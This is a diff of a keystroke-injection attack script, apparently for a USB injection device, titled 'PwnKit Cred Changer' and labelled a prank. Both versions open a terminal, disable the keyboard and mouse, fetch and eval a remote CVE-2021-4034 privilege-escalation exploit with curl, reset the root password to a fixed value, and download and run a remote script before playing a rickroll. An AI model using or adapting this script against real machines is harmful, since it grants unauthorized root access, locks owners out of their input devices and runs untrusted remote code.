@@ -1,58 +1,57 @@
-REM Title: PwnKit Cred Changer
-REM Author: Alex Lynd
-REM Description: Changes root creds using the PwnKit exploit, disables keyboard / mouse, delivers a devastating rickroll payload.
-REM Target: Linux (Bash)
-REM Props: Hak5, HakCat
-REM Version: 1.0
-REM Category: Prank
+// Title: PwnKit Cred Changer
+// Author: Alex Lynd, Kody Kinzie
+// Description: Changes root creds using the PwnKit exploit, disables keyboard / mouse, delivers a devastating rickroll payload.
+// Target: Linux (Bash)
+// Version: 1.5
+// Category: Prank
 
 CTRL ALT T
-DELAY 1000
+WAIT 1000
 
-REM disable keyboard
-STRING xinput float 10
-ENTER
-
-REM disable mouse
-STRING xinput float 12
+// disable keyboard
+TYPE xinput float 10
 ENTER
 
-REM run PwnKit
-STRING eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
+// disable mouse
+TYPE xinput float 12
 ENTER
-DELAY 1000
 
-REM change root password
-STRING passwd
+// run PwnKit
+TYPE eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
 ENTER
-STRING meowmeow123
-ENTER
-DELAY 100
-STRING meowmeow123
-ENTER
-DELAY 300
+WAIT 1000
 
-REM jack up volume
-STRING amixer -D pulse sset Master unmute
+// change root password
+TYPE passwd
 ENTER
-REM STRING amixer -D pulse sset Master 100%+
+TYPE meowmeow123
+ENTER
+WAIT 100
+TYPE meowmeow123
+ENTER
+WAIT 300
+
+// jack up volume
+TYPE amixer -D pulse sset Master unmute
+ENTER
+// TYPE amixer -D pulse sset Master 100%+
 ENTER 
 
-REM download annoying payload
-STRING wget https://gist.githubusercontent.com/AlexLynd/2f8081f1940934e19a5a450ca358d142/raw/b6d4bfe05cb73f8140872448da54fb1824c4d627/linux-color-flasher.sh
+// download annoying payload
+TYPE wget https://gist.githubusercontent.com/AlexLynd/2f8081f1940934e19a5a450ca358d142/raw/b6d4bfe05cb73f8140872448da54fb1824c4d627/linux-color-flasher.sh
 ENTER
-DELAY 500
-STRING chmod +x linux-color-flasher.sh 
+WAIT 500
+TYPE chmod +x linux-color-flasher.sh 
 ENTER
-STRING ./linux-color-flasher.sh &
+TYPE ./linux-color-flasher.sh &
 ENTER
-DELAY 500
-STRING espeak "you've been hacked loser, its time to get funky"
+WAIT 500
+TYPE espeak "you've been hacked loser, its time to get funky"
 ENTER
-DELAY 1000
-STRING firefox "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+WAIT 1000
+TYPE firefox "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 ENTER
-DELAY 3000
+WAIT 3000
 SPACE
-DELAY 1000
-STRING F
+WAIT 1000
+TYPE F
